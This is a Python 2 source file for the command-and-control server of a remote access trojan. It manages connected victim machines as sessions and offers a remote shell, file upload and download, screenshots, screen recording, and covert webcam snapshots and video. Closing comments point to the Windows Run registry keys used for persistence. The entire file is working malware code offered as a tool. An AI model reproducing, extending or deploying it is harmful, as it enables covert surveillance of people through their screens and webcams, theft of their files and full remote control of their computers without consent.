#-*- coding: utf-8 -*
import socket
import struct
import os
import time
import threading

class Server:
    def __init__(self,ip,port):
        self.addr = (ip,port)
        self.all = []
        self.alllinks = []
        self.using = -1
        self.exit = 0
        self.lock = threading.RLock()
        print "[+]Init Successfully"


    def bind(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.bind(self.addr)
        self.sock.listen(50)
        print "[+]Listening...Address:%s:%s"%self.addr


    def links(self):
        while not self.exit:
            cli, (ip, port) = self.sock.accept()
            self.all.append(cli)
            self.alllinks.append((ip, port))
            print "[+]Connect from:" + ip + ':' + str(port)


    def state(self):
        while not self.exit:
            for i in range(0,len(self.all)):
                if not i == self.using:
                    try:
                        self.all[i].sendall("state")
                        self.all[i].recv(1024)
                    except:
                        self.lock.acquire()
                        print "[-]disconnect:"+str(self.alllinks[i])
                        self.all[i].close()
                        self.all.pop(i)
                        self.alllinks.pop(i)
                        self.using -= 1
                        self.lock.release()
                        break
            time.sleep(5)


    def show(self):
        for i in range(0,len(self.alllinks)):
            print str(i) + ":" + str(self.alllinks[i])

    def control(self):
        while True:
            print "control>",
            cmd = raw_input()
            if cmd == "session":
                self.show()
            elif cmd == "control":
                print "session>",
                session = raw_input()
                while True:
                    try:
                        session = int(session)
                        break
                    except:
                        print "session>",
                        session = raw_input()
                if session >= len(self.alllinks) or session < 0:
                    print "session not exist"
                    continue
                else:
                    self.using = session
                    self.check(self.all[session])
            elif cmd == "exit":
                self.exit = 1
                return
            else:
                print "command:session control"



    def check(self,cli):
        while True:
            try:
                print "command>",
                sendcmd = raw_input()
                if not sendcmd:
                    cli.sendall(" ")
                    cli.recv(1024)
                    continue
                if sendcmd == "shell":
                    self.shell(cli)
                elif sendcmd == "download":
                    self.filerecv(cli)
                elif sendcmd == "upload":
                    self.filesend(cli)
                elif sendcmd == "screenshot":
                    self.screenshot(cli)
                elif sendcmd == "screen_stream":
                    self.screen_stream(cli)
                elif sendcmd == "webcam_snap":
                    self.webcam_snap(cli)
                elif sendcmd == "webcam_stream":
                    self.webcam_stream(cli)
                elif sendcmd == "close":
                    self.close(cli)
                    break
                elif sendcmd == "end":
                    cli.sendall("end")
                    self.all.pop(self.using)
                    self.alllinks.pop(self.using)
                    cli.close()
                    self.using = -1
                    break
                elif sendcmd == "bg":
                    break
                elif sendcmd == "help":
                    print "shell download upload screenshot screen_stream webcam_snap webcam_stream close end"
                else:
                    print "usage:help"
                    continue
            except Exception as e:
                print "[-]disconnect:" + str(self.alllinks[self.using])
                self.all.pop(self.using)
                self.alllinks.pop(self.using)
                cli.close()
                self.using = -1
                break


    def filesend(self,cli):
        try:
            print "file>",
            filepath = raw_input()
            while not filepath:
                print "file>",
                filepath = raw_input()
            if os.path.isfile(filepath):
                cli.sendall("upload")
                filehead = struct.pack('128sI',os.path.basename(filepath),os.stat(filepath).st_size)
                cli.sendall(filehead)
                fp = open(filepath,"rb")
                while True:
                    data = fp.read(1024)
                    if not data:
                        break
                    cli.sendall(data)
                fp.close()
                print cli.recv(1024)
            else:
                print filepath+":File not exist"
        except Exception as e:
            print "Failed:"+str(e)


    def filerecv(self,cli,filepath=""):
        try:
            flag = 0
            if not filepath:
                cli.sendall("download")
                print "file>",
                filepath = raw_input()
                while not filepath:
                    print "file>",
                    filepath = raw_input()
                cli.sendall(filepath)
            else:
                flag = 1
            fileinfo_size = struct.calcsize("128sI")
            filehead = cli.recv(fileinfo_size)
            if not filehead == filepath+":File Not Exist":
                filename,filesize = struct.unpack("128sI",filehead)
                filename = filename.strip('\00')
                if flag:
                    filename = filepath
                fp = open(filename,'wb')
                recved_size = 0
                while not recved_size == filesize:
                    if filesize - recved_size > 1024:
                        data = cli.recv(1024)
                        recved_size += len(data)
                    else:
                        data = cli.recv(filesize - recved_size)
                        recved_size = filesize
                    fp.write(data)
                fp.close()
                print "[+]Downloaded:" + filename
            else:
                print filehead
        except Exception as e:
            print "[-]Failed:"+str(e)


    def screenshot(self,cli):
        try:
            prefix = 1
            while True:
                filepath = "screen" + str(prefix) + ".jpg"
                if not os.path.exists(filepath):
                    break
                else:
                    prefix += 1
            cli.sendall("screenshot")
            self.filerecv(cli,filepath)
        except Exception as e:
            print "[-]Failed:"+str(e)


    def screen_stream(self,cli):
        try:
            prefix = 1
            while True:
                filepath = "scr_video" + str(prefix) + ".avi"
                if not os.path.exists(filepath):
                    break
                else:
                    prefix += 1
            cli.sendall("screen_stream")
            print "record time>",
            sec = raw_input()
            while True:
                try:
                    sec = int(sec)
                    break
                except:
                    print "record time>",
                    sec = raw_input()
            cli.sendall(str(sec))
            print "fps>",
            fps = raw_input()
            while True:
                try:
                    fps = int(fps)
                    break
                except:
                    print "fps>",
                    fps = raw_input()
            cli.sendall(str(fps))
            print "sleep time>",
            sle = raw_input()
            while True:
                try:
                    sle = float(sle)
                    break
                except:
                    print "sleep time>",
                    sle = raw_input()
            cli.sendall(str(sle))
            self.filerecv(cli,filepath)
        except Exception as e:
            print "[-]Failed:"+str(e)


    def webcam_stream(self,cli):
        try:
            prefix = 1
            while True:
                filepath = "video" + str(prefix) + ".avi"
                if not os.path.exists(filepath):
                    break
                else:
                    prefix += 1
            cli.sendall("webcam_stream")
            if cli.recv(1024) == "No_cam":
                return
            print "record time>",
            sec = raw_input()
            while True:
                try:
                    sec = int(sec)
                    break
                except:
                    print "record time>",
                    sec = raw_input()
            cli.sendall(str(sec))
            print "fps>",
            fps = raw_input()
            while True:
                try:
                    fps = int(fps)
                    break
                except:
                    print "fps>",
                    fps = raw_input()
            cli.sendall(str(fps))
            print "sleep time>",
            sle = raw_input()
            while True:
                try:
                    sle = float(sle)
                    break
                except:
                    print "sleep time>",
                    sle = raw_input()
            cli.sendall(str(sle))
            self.filerecv(cli,filepath)
        except Exception as e:
            print "[-]Failed:"+str(e)


    def webcam_snap(self,cli):
        try:
            prefix = 1
            while True:
                filepath = "photo" + str(prefix) + ".jpg"
                if not os.path.exists(filepath):
                    break
                else:
                    prefix += 1
            cli.sendall("webcam_snap")
            if cli.recv(1024) == "No_cam":
                return
            self.filerecv(cli,filepath)
        except Exception as e:
            print "[-]Failed:"+str(e)


    def close(self,cli):
        cli.sendall("close")
        self.all.pop(self.using)
        self.alllinks.pop(self.using)
        cli.close()
        self.using = -1


    def shell(self,cli):
        cli.sendall("shell")
        while not cli.recv(1024) == "shell":
            continue
        while True:
            try:
                print "shell>",
                sendmsg = raw_input()
                if not sendmsg:
                    cli.sendall(" ")
                    continue
                if sendmsg == "exit":
                    cli.sendall(sendmsg)
                    break
                cli.sendall(sendmsg)
                s = cli.recv(1024)
                if s == "[+]No output":
                    print "error"
                    continue
                if not s:
                    s = 0
                total = int(s)
                recv_size = 0
                data = ""
                while not total == recv_size:
                    if total - recv_size > 1024:
                        s = cli.recv(1024)
                        data += s.decode('gbk').encode('utf-8')
                        recv_size = len(data)
                    else:
                        s = cli.recv(1024)
                        data += s.decode('gbk').encode('utf-8')
                        break
                print data
            except Exception as e:
                print "[-]shell:"+str(e)
                break


def main():
    ss = Server('0.0.0.0',12314)
    ss.bind()
    t1 = threading.Thread(target=ss.links)
    t2 = threading.Thread(target=ss.control)
    t3 = threading.Thread(target=ss.state)
    t1.start()
    t2.start()
    t3.start()
    t3.join()
    t2.join()
    t1.join()




if __name__ == '__main__':
    main()

#send msg only not file
#send && recv seprate
#reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
#reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run